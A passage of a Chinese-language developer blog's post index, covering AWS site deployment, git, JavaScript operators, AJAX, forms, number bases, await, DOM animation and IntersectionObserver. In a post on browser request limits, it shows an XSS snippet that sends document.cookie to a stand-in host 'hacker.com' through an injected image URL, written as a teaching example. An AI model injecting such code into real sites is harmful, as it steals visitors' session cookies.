WHERE User='root'; FLUSH PRIVILEGES; 看到有影響 1 個欄位就代表成功了： 123Query OK, 1 row affected (0.01 sec) # 影響一個欄位Rows matched: 1 Changed: 1 Warnings: 0Query OK, 0 rows affected (0.01 sec) 離開 mySQL 1exit 設定 root 的密碼 再提醒一次，剛剛設定的密碼不是給 root 用的，所以這邊要再重新設定一次。 1sudo mysql_secure_installation 是否設定密碼？(y) 密碼強度設定： Low (0) = 長度 &gt;= 8 Medium (1) = 長度 &gt;= 8，要有大小寫和特殊字元 Strong (2) = 長度 &gt;= 8，要有大小寫，特殊字元和 dictionary file（字典檔？反正應該就是一種文字檔吧） 怕麻煩的話選 0 就好，除非你真的很注重安全性。 輸入密碼： 這邊輸入時發現沒有東西是正常的，不是你鍵盤壞掉。 總之呢，相信你的感覺就對了，接下來會連續問一些問題，可以都輸入 y，最後看到 All done! 就 OK 了。 做到這邊後，就可以回瀏覽器到 phpmyadmin 重新登入了。 測試檔案環境設定好後，可以來試著放檔案上去看看。 接下來就是考驗你對 CLI 的熟練度了，試著用 cd 和 ls 來找到 var 這個資料夾吧。 接著進到裡面 1cd var/www/html 嘗試建立一個新檔案 1touch index.php 這時候會跟你說權限不足（Permission denied），所以要來設定一下。（跟 chmod 是差不多的概念） 1sudo chown ubuntu /var/www/html 設定完後應該就能建立檔案囉。 接著用 vim 來寫一些東西： 回到瀏覽器的網址輸入 IPv4/index.php 看看有沒有 work! 大功告成！到這邊為止，你已經把虛擬主機的環境都設定好囉。 第三步：購買域名先到 gandi 買一個自己喜歡的域名。（或去其他地方買也行） 附註：後來結帳才發現 .com 是公司或集團才可以用的域名，哈哈！ 接著是一些基本的結帳流程，就不特別貼了，因為要一直把個資馬掉有點麻煩。 最後結帳完的結果： 接著要來把 Domain 和 IP 串起來，先回到首頁登入，會自動進入主控台。接著點選域名 &gt; peanu.tw（你買的域名） &gt; DNS 紀錄： 把 A 的值改成 AWS 的 Ipv4 就可以了。 最後你就可以用網域來連啦～ 文末以上就是部署的整個過程，很開心自己把這個流程給跑完了。 最後是一些錯誤紀錄 選到同樣的協定 The same permission must not appear multiple times 簡單來說就是我眼殘，選到兩個 HTTP。應該要選擇 HTTP 和 HTTPS 才對。 ssh 連主機時發生錯誤 1234The authenticity of host 'ec2-3-93-242-234.compute-1.amazonaws.com (Ipv4)' can't be established.ED25519 key fingerprint is SHA256:&lt;key-value&gt;.This key is not known by any other namesAre you sure you want to continue connecting (yes/no/[fingerprint])? 參考 這篇文章 後得知，原來是透過 SSH 連到某個主機時，會先比對雙方的 key（防止中間人攻擊）。但是我們是第一次連線，電腦裡面沒有之前的 public key 紀錄，所以才會跳上面那個警告，確保你是否信任這個主機。 總之呢，輸入 yes 就可以了。這個動作自動會把 public key 儲存到 ~/.ssh/known_hosts 檔案裡，這樣下次在比對 key 的時候就能查到紀錄了。","link":"/2022/03/08/deploy-my-website/"},{"title":"clone 跟 fork 的差異","text":"我以前一直沒搞清楚的東西。 用情境來解釋如果你對別人的 repository 有興趣，你可以： 用 git clone 複製到自己的本地端。不過這只能讓你在本地端做修改（commit），你沒有辦法把本地的修改內容 push 到別人的 repository。另外，clone 也會把原本的 .git 檔案給複製一份，所以會保留原本這份專案的 commit 資訊。 先在 GitHub 上「fork」別人的專案到自己的 repository，接著在把這個複製過來的 repository 用 git clone 到自己的本地端，最後再把本地的修改用 gir push 來做更新。 如果你把 clone 下來的檔案更新又 push 回去別人的專案，Git 會跳出以下錯誤： 12remote: Permission to sparanoid/chinese-copywriting-guidelines.git denied to jubeatt.fatal: unable to access 'https://github.com/sparanoid/chinese-copywriting-guidelines.git/': The requested URL returned error: 403 簡單來說就是不允許的意思（關鍵字：Permission denied）。","link":"/2021/12/13/difference-between-clone-and-fork/"},{"title":"++ 跟 -- 放前面後面的差別","text":"好像是以前常見的考題。 簡單來說，放前面的意思就是「先把 a + 1」，在執行那一行敘述句；反過來，放後面的意思是「先執行那一行敘述句」，做完才把 a + 1。 a++123var a = 0console.log(a++ &amp;&amp; 30) // 0console.log(a) // 1 你可以把它想成是這樣： 123console.log(a &amp;&amp; 30) // 0a+=1console.log(a) // 1 ++a反過來也一樣： 123var a = 0console.log(++a &amp;&amp; 30) // 30console.log(a) // 1 一樣想成是這樣： 123a+=1console.log(a &amp;&amp; 30) // 30console.log(a) // 1 運用在迴圈中懂前面的邏輯後，你可以把常見的迴圈寫成這樣： 1234var i = 0while (i &lt;= 10) { console.log(i++)} 其實就跟常見寫法的意思相同，只是看起來比較簡潔而已。","link":"/2021/12/17/difference-between-plusplus-and-minusminus/"},{"title":"用 AJAX 跟 Form 表單發 request 的差異","text":"小知識大學問。 Form在 devtool 上的 type 會是：document 最大的問題是「會換頁」，原因是瀏覽器一拿到 response 時就會 render 出來。 另外要注意這種發 request 的方法是透過 HTML，跟 JavaScript 一點關係都沒有。 AJAX在 devtool 上的 type 會是：xhr 最大的優點是「不會換頁」，瀏覽器拿到 response 後會「傳給 JavaScript」而不是直接 render 出來。 簡單示範： 1234567891011121314151617181920212223242526const request = new XMLHttpRequest()// 拿到 response 的處理request.addEventListener('load', function() { if (request.status &gt;= 200 &amp;&amp; request.status &lt; 400) { console.log('success') console.log(request.responseText) } else { console.log('err')\\ }})// 沒有拿到 response，代表出錯request.addEventListener('error', function() { console.log('err')})/* @param1: 要使用的 HTTP method @param2: 要發到哪裡 @param3: 非同步（true） or 同步（false）*/request.open('GET', 'https://reqres.in/api/users/1', true)/* 執行到這一行就會發 request 了， 所以 event listener 一定要寫在前面*/request.send() 要注意一下 response 會被綁在 XMLHttpRequest 的屬性上，不像在 Node.js 裡用 request 套件是傳到 callback 裡面。","link":"/2022/01/25/diffrence-between-ajax-and-form/"},{"title":"form 的 GET 與 POST 的差異","text":"我覺得很重要。 懶人包GET 的特性最重要的點：網址會變 按下 submit 的時候，網址會在後面加上 ?parameter=value 不會有 request body，因為沒有東西要帶去給後端 網址有長度限制 網址不可以放敏感資訊 會自動做 URL encoded（很重要） 舉例來說： 如果今天在輸入框輸入 a=1，如果沒有 encoded 的話，網址就會變成是 ?name=a=1，但這樣子後端會很困擾，因為後端是透過 = 來把 key 跟 value 給切割的，所以必須 encoded 成 ?name=a%3D1 補充：JavaScript 裡面有提供 encoded 跟 decoded 的 function 12encodeURIComponent('a=1') =&gt; \"a%3D1\"decodeURIComponent('a%3D1') =&gt; \"a=1\" 所以後端大概也是這樣操作的。 POST 的特性最重要的點：網址不會變，看不出差異 會把東西放在 request body 裡面 可以放敏感資訊，因為從網址看不出任何東西 如果表單內容有特殊文字或中文字，一樣會被 encode（可打開 payload 查看） 小知識Q1. 為什麼你貼搜尋結果頁面給別人，別人可以跟你看到一樣的搜尋結果頁面？ A：因為搜尋結果頁面是透過 GET 方法來取得的，而 GET 是在網址上加上參數，所以只要用一樣的參數去發送 request，伺服器就能根據參數的內容 response 一樣的頁面。 Q2. 為什麼在填表單的頁面要離開時，都會跳一個視窗問你「真的要離開嗎？內容可能會遺失…」的問題？ A：因為要帶給資料到後端一定要用 POST 才可以，而 POST 的特性是「網址不會變」，所以如果表單填到一半就離開，這些內容是沒辦法被保存的，因為網址就長那樣子。所以也不可能發生你貼一個網址給別人就轉帳成功的情況。","link":"/2022/01/06/diffrence-between-form-get-and-post/"},{"title":"在 Node.js 跟瀏覽器上發 request 的差異","text":"小常識。 簡述一個是直接發幫你發，一個是要經過「瀏覽器」。後者的限制比較多，例如「CROS」、「Same Origin Policy」等等。伺服器傳 response 也是一樣，後者要經過瀏覽器這一步。 除了各種限制之外，還會被「加料」像是 user-agent 這類的 header，伺服器可以從中得到資訊。 Same origin policy發 request 的時候瀏覽器會自動幫你加上 origin 這個 header，讓 server 知道「來源」是哪裡，接著 server 在透過「CROS」來決定要讓誰可以存取資源 Access-Control-Allow-Origin 例子可以直接參考：從遊戲來認識 CORS 與瀏覽器的限制 為什麼只有瀏覽器有限制？首先是環境的差異，瀏覽器是「公共環境」、Node.js 是「私有環境」。在公共環境下就得特別注意「隱私性」的問題。 瀏覽器的 cookie 會儲存一些個人資料，像是帳號密碼。而瀏覽器發 request 到某個 Domain 的時候都會帶上對應的 cookie。 利用「自動帶上 cookie」的這個特性，壞人就有機會竊取你的 cookie，參考下面的例子。 假設我是壞人，我可以在有 XSS 漏洞的網站嵌入以下內容： 123456const hackerServer = `https://hacker.com?cookie=${escape(document.cookie)}`const img = document.createElement('img')img.setAttribute('src', hackerServer)document.querySelector('body').appendChild(img) 當使用者來到被「加料」後的漏洞網站後，就會自動把 cookie 送到「駭客的後端伺服器」，接著駭客就可以拿 cookie 來做壞事了。 詳細步驟是這樣： 在漏洞網站嵌入圖片，這個圖片的網址是「駭客的伺服器位置」+「使用者在這個網站的 cookie」 圖片載入的時候就會自動發 request，所以使用者根本不知道自己的 cookie 被偷了 詳細可以參考這個網站 另外 [FE102] 提到的「email 收件通知」的原理也跟這個差不多。","link":"/2022/01/25/diffrence-between-nodejs-and-browser/"},{"title":"數字系統並沒有你想的那麼複雜","text":"前言今天要談的主題是「數字系統」 數字系統在我們的生活或許不怎麼起眼，但如果是在電腦科學這個領域，就很難不談到它了。不知道各位會不會跟我一樣，一直對於數字系統有點似懂非懂的感覺，或者是需要用到時就滿頭霧水。基於這個原因，所以我決定寫一篇文章來記錄，希望跟我有一樣這種困擾的各位能夠好好紮實地把這些重要知識給學起來！ 學習目標 了解數字系統（知道什麼是二進位、八進位、十進位、十六進位） 知道怎麼把轉換進位制（例如：十進位轉成二進位） 知道怎麼寫出一個能夠轉換進位制的程式碼 正文認識數字系統在學怎麼對數字做轉換前，當然要先知道什麼叫數字系統，所以這裡會先簡單介紹一下關於數字系統的知識。 數字系統可以分為： 二進位（Binary） 八進位（Octal） 十進位（Decimal） 十六進位（Hexadecimal） 先從我們生活中最熟悉的的十進位來做說明吧。（我們現在正在使用的數字系統就是十進位） 題外話：為什麼我們的數字系統是 10 進位？ 也許是因為我們人只有 10 根手指頭吧… 如果你對於「進位」這個詞感到很害怕或陌生的話，別擔心。 其實講的白話一點，這只是用來代表 「你要用哪個規則來表示一個數」 的意思。 而且你早就學會怎麼做進位這件事了（待會就知道了） 不知道各位有沒有上過計算機概論或者自己 Google 過，大部分應該會得到這樣的解釋： 「逢 10 進位」（如果是十進位的話） 以前的我聽到這個解釋後，我心裡的感想是，痾…到底什麼叫做逢 10 進位？ 不過在我理解後，我認為這句話的完整意思應該要這樣說：「每當碰到 10 這個數字，就增加一個位數」 讓我們直接來看個例子吧。 如果要你算 18 + 25，你會怎麼計算呢？（我知道你會馬上說是 43，但重點是你怎麼算的？） 我相信不管你是數學菜逼還是數學天才，應該都是用這種方式來計算的。 先計算8 + 5的部分，會得到13 接著因為13超過 10 了，所以把1加到下一個位數，留下3 接著計算1 + 2的部分，會得到3 接著因為前面的1要加到這個位數，所以最後3要再加上這個被進位的1，得到4 最後才能得到答案43 不知道你有沒有注意到？ 在第二個步驟的時候，你很自然的做了進位這件事，你知道 13 是一個超出 10 的數字，所以就把 1 放到十位數去，讓個位數只剩下 3。 沒錯，逢 10 進位就是指這個很簡單的動作而已。 如果你還是似懂非懂的話，你可以再思考看看，如果你不做進位這個動作的話，會變怎麼樣？ 先計算8 + 5的部分，會得到13 接著計算1 + 2的部分，會得到3 最後得到313 這時候你應該就能理解，為什麼需要進位這件事了吧？ 如果沒有進位的話，那數字會變得非常的長，你也很難理解這個數實際要表達的是什麼。 所以再強調一次，數字系統的用途只是讓你更好地去 「表示一個數」，僅此而已。 到這邊你都能理解的話，那接著要理解其他進位制就不是什麼難事了，只是換一個規則來表示而已。 來看一些例子吧 現在我們有一個 10 進位的數字3，現在我們要改成用 2 進位來表示的話，怎麼表示？ 首先，既然是二進位，所以我們的規則就會變成是「逢 2 進位」。 3是一個超過 2 的數字，所以把1加到下一個位數，留下1 1沒有超過 2，所以不用再進位 最後得到11 再來一個，4的話呢？ 4是一個超過 2 的數字，所以把1加到下一個位數，留下2 2還是一個超過 2 的數字，所以再把1加到下一個位數，留下0 2（前面進位的兩個 1），是一個超過 2 的數字，所以把1加到下一個位數，留下0 1沒有超過 2，所以不用再進位 最後得到100 以上大致就是數字系統的核心概念了，只要你能理解，那就算你想發明一個 87 進位也應該不會是個問題…. 這邊特別補充一下，有些人可能會想問？十六進位的話10 ~ 11要怎麼表示？ 這個疑惑很合理，畢竟我們直接用 11 ~ 15 來表示一個位數的話顯然是有點難理解。 所以為了避免這個問題，會改用這樣來表示： a 代表 10 b 代表 11 c 代表 12 d 代表 13 e 代表 14 f 代表 15 這裡提供一個進位轉換的網頁，如果還是不太清楚的話，可以到這裡去玩玩看，去觀察數字在進位時的變化，多試幾次就能幫助你去理解這個概念囉！ 怎麼對數字做進位制轉換在學怎麼轉換前，先解釋一下為什麼要學這個東西。 雖然現在隨便 Google 都有現成的工具可以幫你做進位轉換，但有些時候重要的並不只是數字轉換後的結果，而是它在轉換過程中的一些涵義。 試著去理解這些涵義，會對你在寫程式或思考的時候是有一些幫助存在的（相信我~） 把十進位轉換成其他進位假設一個十進位的數字為25，接著來試著把它轉換成二進位 二進位 25 / 2 = 12 … 1 12 / 2 = 6 … 0 6 / 2 = 3 … 0 3 / 2 = 1 … 1 1 / 2 = 0 … 1 接著再把這些數字由下至上組合起來，11001就是 25 的 2 進位表示法。 你應該注意到了，我們其實就只是一直在做，除以 2 後得到的餘數而已，所以你也能把他稱作取餘數大法（？ 所以只要你知道怎麼取餘數，那你就會做進位制的轉換了。 不過在這裡先聲明，雖然你可以用死記的方式來做轉換，但比起用死記的，我更推薦你去理解背後的涵義。 只要你仔細去觀察每個步驟，就會發現它其實並不複雜，都是前面所說的基本概念而已。 所以我們先看到第一個步驟。 對 25 除以 2，得到商為12，餘數為1 這裡你先思考看看，為什麼我們要對 25 做除以 2，跟取它的餘數這件事？（回想看看我們介紹數字系統時的概念） 因為 25 是一個超過 2 的數嘛！所以要做什麼？進位阿！阿要進位幾次？進位數字到不超過 2為止嘛！ 那我要怎麼知道該進位幾次，跟什麼時時候數字才會不超過 2 這件事？ 透過第一步所做的事情就能知道囉！ 把某個數字對 2 做除法，求出它的商跟餘數，商數代表這個數字進位了幾次，餘數就代表剩下了多少數。 一直重複這個步驟，直到商數為 0，就代表不能再進位了，而此時的餘數就代表進位到最後剩下的數。 所以我們在重新看一下前面的計算，可以列成以下這些步驟： 25 / 2 = 12 … 1，代表 25 可以被 2 進位12次，剩下1，進位後的 12 還可以被 2 進位幾次？ 12 / 2 = 6 … 0，代表 12 可以被 2 進位6次，剩下0，進位後的 6 還可以被 2 進位幾次？ 6 / 2 = 3 … 0，代表 6 可以被 2 進位3次，剩下0，進位後的 3 還可以被 2 進位幾次？ 3 / 2 = 1 … 1，代表 3 可以被 2 進位1次，剩下1，進位後的 1 還可以被 2 進位幾次？ 1 / 2 = 0 … 1， 代表 1 不能再被 2 進位了，最後剩下的數為1。 不管是二進位、八進位、十六進位，甚至是十進位本身，都可以遵循這個規則去做。 接著試著自己練習看看吧！把 25 轉換成其他進位看看，如果都正確的話，就代表你有理解這個概念囉！ 把其他進位轉換成十進位延續前面的例子，現在我們知道11001是代表 25，但這之間是發生了什麼？怎麼做到的？ 其實你只要把她拆成次方來看就可以了，像這樣： 1 x 24 + 1 x 23 + 0 x 22 + 0 x 21 + 1 x 20 把上面這些算式算出來後，就會得到25 傑克，這真是太神奇了！！ 為什麼能這樣呢？ 我個人認為比較好理解的方式是，用位數的概念來觀察。 譬如說，如果是要你把 10 進位用次方來表示的話，你應該能很直覺的得出以下式子： 25 = 2 x 101 + 5 x 100，得到25 為什麼這麼直覺？ 首先你知道，10 進位代表每個位數的數字只能在 0 ~ 9 接著你又知道第一個位數的範圍必須是在 0 ~ 9 之間的數，那一定得是1 x n這樣的算式才有辦法求出，所以如果要寫成次方的話，我們只能寫成 100，接著在把 100去乘上一個數，就能得出 0~9 之間的數字。 接著是第二個位數，代表數字的範圍必須在 10 ~ 99 之間，那就一定得是10 x n這樣的算式才有辦法求出，所以寫成次方的話就會是 101，接著再把 101去乘上一個數，就能得出 10~99 之間的數字。 最後把兩個數字相加，就能得出最後的結果，也就是25 其實換成 2 進位也是一樣的道理： 首先你知道，2 進位代表每個位數的數字只能在 0 ~ 1 現在第一個位數的範圍是在 0 ~ 1，那得是1 x n，所以就會是 20 第二個位數的範圍是在 2 ~ 4，那得是 2 x n，所以就會是 21 第三個位數的範圍是在 4 ~ 8，那得是4 x n，所以就會是 22 以此類推 發現到規律了嗎？每當我們進一個位數，就代表範圍會增加一倍，所以次方的數字就得跟著加 1。 所以再回過頭來看11001 照著前面的邏輯，你腦中應該要有這個畫面： 1 1 0 0 1 1 x 24 1 x 23 0 x 22 0 x 21 1 x 20 接下來該怎麼變成 10 進位應該就不用我多解釋了吧？ 實做一個轉換進位的程式這裡就留給各位去挑戰看看，如果感到苦惱的話就先思考看看自己是不是有什麼地方沒有弄清楚？ 另外關於 16 進位，因為要考慮到 10 ~ 15 的問題，所以這部分如果覺得比較複雜的人，可以先省略 16 進位，先從二、八進位試試看！ 附上自己的程式碼： 12345678910111213141516171819202122232425262728293031323334353637function covert(n, base) { // 儲存轉換後的結果(用三元運算子設定初始值) let result = base !== 16 ? 0 : '' // 代表位數 let digit = 0 while (n !== 0) { // 餘數 let remainder = n % base // 16進位的餘數處理 if (remainder === 10) remainder = 'A' if (remainder === 11) remainder = 'B' if (remainder === 12) remainder = 'C' if (remainder === 13) remainder = 'D' if (remainder === 14) remainder = 'E' if (remainder === 15) remainder = 'F' // 非16進位的表示法 if (base !== 16) { // 取出餘數並乘上對應位數 result += remainder * 10 ** digit // 更新為下個位數 digit++ // 取出進位數 n = Math.floor(n / base) } else { result = remainder + result // 取出進位數 n = Math.floor(n / base) } } return result}console.log(covert(8, 2)) // 1000console.log(covert(26, 16)) // 1A 文末謝謝看完這篇文章的各位，自己開始寫文章後才明白，寫文章不是件想像中容易的事，不知不覺中一個下午就消失了。不過在完成這篇文章後，我也感受到其實寫文章對於學習確實是有幫助的，在撰寫的過程中也能發現一些自己的問題。 像是很多時候我們以為自己了解某個東西，但實際上並不是這個樣子，事實上我們並沒有真正的理解，只是誤以為自己好像理解這件事，所以我們才更需要去正視自己的問題，找出改善方法，或者弄清楚是卡住的哪個點？這樣子可能才能真正的去學好一個知識吧？我是這樣子認為的。 最後還是再次感謝各位，如果這篇文章幫你解開了你多年的困擾的話，那就再好不過了！當然，如果文中有任何錯誤，或是你認為有更好的建議的話，歡迎向我聯絡。 參考資料二、八、十與十六進位 (數字系統) 轉換教學免費線上單位換算數字系統 - NUTNCSIE10412","link":"/2021/07/06/digital-system-conversion/"},{"title":"DOM 之在動畫結束後做某件事","text":"這下有趣囉。 簡述簡單來說要實作出跟 jQuery animate 的 callback 一樣的效果。 所以上網查了一下，發現邏輯不複雜，只需要透過 setTimeout 來讓 callback 等到動畫結束時才執行。 在動畫結束後刪除元素舉一個簡單的範例，要做出這樣的效果： 1234&lt;div class=\"wrapper\"&gt; &lt;div class=\"block\"&gt;&lt;/div&gt;&lt;/div&gt;&lt;button&gt;Animation trigger&lt;/button&gt; 1234567891011121314151617// 動畫秒數let duration = 1// 點按鈕 -&gt; 執行動畫document.querySelector('button') .addEventListener('click', handlerAnimation)function handlerAnimation () { // 取得元素 const element = document.querySelector('.block') // 利用 transition 做出漸變效果 element.style.transform = 'translateX(400px)' element.style.transition = `transform ${duration}s` // 等動畫結束後才把 .block 移除 setTimeout(() =&gt; { element.remove() }, duration * 1000)} 就這麼簡單，不用懷疑！ 捏一個陽春版的 animate其實就是用 function 包裝起來，然後添加一些可調整的參數： 1234567891011121314151617181920212223242526272829303132/* @param selector: 要執行動畫的元素 @param cssRule: 要調整的 css 規則 @param duration: 動畫秒數 @param callback: 動畫結束後要做的事*/function animate(selector, cssRule, duration, callback) { const element = document.querySelector(selector) for (let key in cssRule) { // 更新 css 規則 element.style[key] = cssRule[key] // 漸變效果 element.style['transition'] = `${key} ${duration}s` } // 動畫執行完後要做的事 setTimeout(() =&gt; { // 記得把指定元素用 callback 帶回去 callback(element) }, duration * 1000)}// 按下按鈕 -&gt; 執行動畫 -&gt; 動畫結束後刪除元素 document .querySelector('button') .addEventListener('click', () =&gt; { animate( '.block', {'transform': 'translateX(400px)'}, 1, (element) =&gt; element.remove() ) }) 如果要支援多個 css 規則要修改一下 transition 的部分： 1234567891011121314151617181920212223242526272829303132333435363738394041/* @param selector: 要執行動畫的元素 @param cssRule: 要調整的 css 規則 @param duration: 動畫秒數 @param callback: 動畫結束後要做的事*/function animate(selector, cssRule, duration, callback) { const element = document.querySelector(selector) // 儲存要加上漸變效果的規則 let transitionValue = [] // 更新 css 規則 for (let key in cssRule) { element.style[key] = cssRule[key] // 儲存所有 css 規則 transitionValue.push(key) } /* 設定漸變，先 join 完再補上尾綴 重複的規則：'秒數s, ' =&gt; aaa 1s, bbb 1s */ element.style['transition'] = transitionValue.join(` ${duration}s, `) + ` ${duration}s` // 動畫執行完後要做的事 setTimeout(() =&gt; { callback(element) }, duration * 1000)}document .querySelector('button') .addEventListener('click', () =&gt; { animate( '.block', { 'transform': 'translateX(400px)', 'background-color': 'red', 'width': '0px' }, 1, (element) =&gt; element.remove() ) }) 因為 transition 的部分沒辦法用 += 來新增值，所以要拆開來寫，不能寫在迴圈裡面。","link":"/2022/01/24/do-someting-after-animation/"},{"title":"await 的等待機制跟我想的不太一樣","text":"真神奇。 簡述首先以下都只是我個人實驗出的結果，並根據實驗結果來得出的「結論」。沒有參考規範，也毫無明確性可言（也許只是我唬爛）。所以當作參考就好，我的觀點很有可能是錯的。 範例先來看一般的同步處理，瀏覽器在處理同步段落的時候會出現「freeze（凍結）」的情境，必須等到同步執行完後才「unfreeze（解凍）」： 1234567891011121314151617~async function() { // 監聽 click 事件 document .querySelector('button') .addEventListener('click', () =&gt; { console.log('click') }) // 同步跑迴圈，陷入 freeze 狀態 // 所有的 click 都會被放在 callback queue for (let i=0; i&lt;=10000000000; i++) { } // 等到迴圈跑完 click 才會全部蹦出來！ console.log('loop finished')}() Output： 關於同步行為在 Event loop 的機制可以參考這張精美的圖： 接下來是 await 等待 Promise 執行完後的處理。 我原本預期會跟上面一樣，因為 await 不就是把非同步變成同步嗎？它必須等到 resolve 後才執行後面的程式碼，但實驗結果是出乎預料的： 1234567891011121314151617~async function() { document .querySelector('button') .addEventListener('click', () =&gt; { console.log('click') }) // 如果這裡也變成同步， // 那應該會跟剛剛一樣出現 freeze 的情況 await new Promise((resolve, reject) =&gt; { setTimeout(() =&gt; { console.log('finished') resolve() }, 1000 * 5) }) // 等 Promise 跑完才執行 console.log('yo')}() Output： 結論其實我沒有很懂背後的原理是什麼，不過從結果來看似乎 await 並不是真的把 Promise 從「非同步」變成「同步」，而是有某種機制可以讓 resolve 執行完後才接著跑，而最重要的是這個機制不會讓瀏覽器被凍結住。 題外話，會無聊做這實驗是因為學了 await 後突然回想起同步的概念。同步的特性是會讓瀏覽器「卡在哪裡等」。所以推測如果真是如此的話，那不就很有可能在等某個 Promise 結束前都被「卡住」嗎？這樣不會有問題嗎？因此就抱著好奇的心來測試看，做了這個小實驗。 最後不得不說設計出這些東西的人真的很強大。 後記（原本的推導過程也蠻有趣的，所以就留著不修正了） 後來上網查之後理解了，原來 await 只是把 Promise 包裝起來的語法糖。意思是說 await 只是讓你「看起來好像是同步」，但背後其實是幫你把東西放到 .then() 裡面一個一個執行，參考下面的例子： 1234567891011121314151617181920~async function() { document .querySelector('button') .addEventListener('click', () =&gt; { console.log('click') }) // 看起來好像是同步，先等這行跑完 await waitFiveSeconds() // 才執行這行 console.log('yo')}()function waitFiveSeconds() { return new Promise((resolve, reject) =&gt; { setTimeout(function() { resolve() }, 1000 * 5) })} 但把糖果拆開後就發現一樣是 .then： 1234567891011121314151617181920212223~async function() { document .querySelector('button') .addEventListener('click', () =&gt; { console.log('click') }) /* .then: setTimeout 結束，resolve 沒有帶參數所以回傳值是 undefined .then: 下一行要執行的 'yo' */ waitFiveSeconds() .then(() =&gt; undefined) .then(() =&gt; console.log('yo'))}()function waitFiveSeconds() { return new Promise((resolve, reject) =&gt; { setTimeout(function() { resolve() }, 1000 * 5) })} 所以這也是為什麼 await 一定要放在 async 函式裡面，因為在裡面它才能夠把「非同步」用 Promise 包裝起來，讓你感覺像是「同步」執行一樣，但其實背後還是用 .then 一行一行來執行的。 最後在附上一個小範例，看你能不能猜出正確的執行順序： 12345678910111213141516171819202122~async function() { // 同步 console.log('sync') // 非同步 document .querySelector('button') .addEventListener('click', () =&gt; { console.log('click') }) // 非同步，但用 Promise 包起來控制執行順序 // .then(() =&gt; undefined) await new Promise((resolve, reject) =&gt; { setTimeout(() =&gt; { console.log('finished') resolve() }, 1000 * 5) }) // .then(() =&gt; console.log(yo)) console.log('yo')}()// 同步console.log('haha') 答案是： 1234synchahafinishedyo","link":"/2022/01/23/does-await-make-freezing/"},{"title":"利用 IntersectionObserver 來製作無限滾動","text":"還不錯用～ 基本概念簡單來說 IntersectionObserver 是一個物件，你必須先定義好一些設定： root 外層容器 target 容器中會出現的元素 threshold 重疊率 callback 進入跟離開可視範圍時就呼叫 callback 來通知你 原理是在背後監聽 root 和 target 的「重疊程度」，當達到指定的「可視範圍」時就呼叫 callback 不同於 scroll 事件的地方是，它的精準度不能計算到 1 個 px 不差，意思是說 threshold 設為 0 的時候未必會在「剛好 0px」的時候才觸發 callback，有可能是 0.01 或 0.1。（不過通常你也不太需要精準到 100%） 基本上就是這樣，剩下的用範例來解釋吧。 範例基本結構123456789101112// 外層容器const root = document.querySelector('.root')// 容器中的元素const target = document.querySelector('.detector')// new 一個 IntersectionObserver 出來const observer = new IntersectionObserver(callback, { root: root, rootMargin: '0px', threshold: 0})// 綁定要監聽的 target ，可以想成是 addEventListenr 的概念observer.observe(target) 備註：root 沒有設定的話預設是 null，這時候會等於瀏覽器的 viewport。 結構大致上就是這樣，注意一下 IntersectionObserver 在 new 的時候有兩個參數： callback 進入跟離開可視範圍時通知你，你可以在這裡做事情 options 一些可以設定資訊，root 是誰，重疊率多少的時候才算可見等等之類的。 最重要的是 threshold 的值，這個代表 root 跟 target 的重疊率多少時要呼叫 callback。 舉例來說，如果設為 1 就代表「必須在容器中完整看到 target」才會觸發 callback；如果設為 0 就代表「只要在容器中一看到 target」就觸發 callback。 另外還有個地方要特別注意，就是呼叫 callback 的時機點是「進入」跟「離開」時都會觸發，意思是說一開始 target 進入視線時會觸發一次，當 target 離開視線也會再觸發一次。 這邊的 threshold 是設為 0，所以一看到 target 就會觸發 callback，而離開的時候也會觸發一次。 callback 接收的兩個參數分別是 entries 跟 observer： entries，一個 Array 裡面裝著 IntersectionObserverEntry 物件，可以拿到一些必要資訊。 observer，就是被 new 出來的 observer 物件自己 isIntersecting 跟 intersectionRatio 這兩個比較重要： isIntersecting true / false 代表 target 可不可見，可以在 callback 中用它來判斷是「進入」還是「離開」的狀態。 intersectionRatio 就是「重疊率」，debug 的時候可以用它來檢查。 舉個例子： 123456789101112// 解構陣列function callback([ entries ], observer) { if (entries.isIntersecting) { console.log('重疊率：',entries.intersectionRatio) console.log('target 是否可見：',entries.isintersectiing) console.log('進入可視範圍！') } else { console.log('重疊率：',entries.intersectionRatio) console.log('target 是否可見：',entries.isintersectiing) console.log('離開可視範圍') }} 所以在製作無限滾動時，因為新增內容而離開可視範圍時會在觸發一次 callback，就會有「重複觸發」的問題。如果要避免這種情況，就能用 isIntersecting 來確認是「進入」可視範圍時才做處理。 無限滾動範例原理不複雜，就是在一個 container 裡面放一個 sentinel（哨兵），當 sentinel 進入可視範圍時就透過 callback 來新增內容。 1234567&lt;!-- 外層容器 --&gt;&lt;div class=\"root\"&gt; &lt;!-- 文章列表 --&gt; &lt;div class=\"list\"&gt;&lt;/div&gt; &lt;!-- 哨兵 --&gt; &lt;div class=\"sentinel\"&gt;I am detector!&lt;/div&gt;&lt;/div&gt; 123456789101112131415const root = document.querySelector('.root')const target = document.querySelector('.sentinel')const observer = new IntersectionObserver(callback, { root: root, rootMargin: '0px', threshold: 1})observer.observe(target)function callback([ entries ], observer) { // 確認是「進入」才新增文章 if (entries.isIntersecting) { insertArticle(1) }} 這邊為了方便觀察所以把 threshold 設為 1，代表要「完整看到 target」才會觸發 callback。另外為了避免離開 target 時再次觸發所以要用 isIntersecting 來做判斷。 做個示範，先示範正確的做法： 12345678910/* 只在進入的情況新增內容 */function callback([ entries ], observer) { if (entries.isIntersecting) { console.log('進入可視範圍') /* 一次新增 3 個 */ insertArticle() } else { console.log('離開可視範圍') }} 錯誤的做法（會重複觸發）： 12345678910/* 如果沒有檢查的話，其實就跟下面的做法是一樣的意思 */function callback([ entries ], observer) { if (entries.isIntersecting) { console.log('進入可視範圍') insertArticle() } else { console.log('離開可視範圍') insertArticle() }} 注意因為觸發了兩次，所以內容一次多了 6 個。 總而言之注意這個問題就好，其他就差不多這樣了。","link":"/2022/01/29/dom-IntersectionObserver/"},{"title":"DOM 一些邊緣但蠻好用的 API","text":"懶人包。 element.getBoundingClientRect()取得元素的寬高與位置資訊 12345678&lt;style&gt; div { width: 400px; padding: 10px; border: 10px; }&lt;/style&gt;&lt;div&gt;yoyoyo&lt;/div&gt; 1console.log(document.querySelector('div').getBoundingClientRect()) Output： 12345678910{ x: 8 y: 8 top: 8 left: 8 right: 448 bottom: 66.4000015258789 width: 440 height: 58.400001525878906} 此方法回傳的寬高是採用 border-box 的計算方式，意思就是算到 boder 為止。 而座標部分是相對於 viewport x / left 元素的左上角與 viewport 的水平距離 y / top 元素的左上角與 viewport 的垂直距離 right / bottom 元素的右下角距離 viewport 的水平垂直距離 window.scrollTo()設定滾軸要滾到哪裡 123456789101112/* 閉包，把變數 index 藏起來 */function scrollDown() { let index = 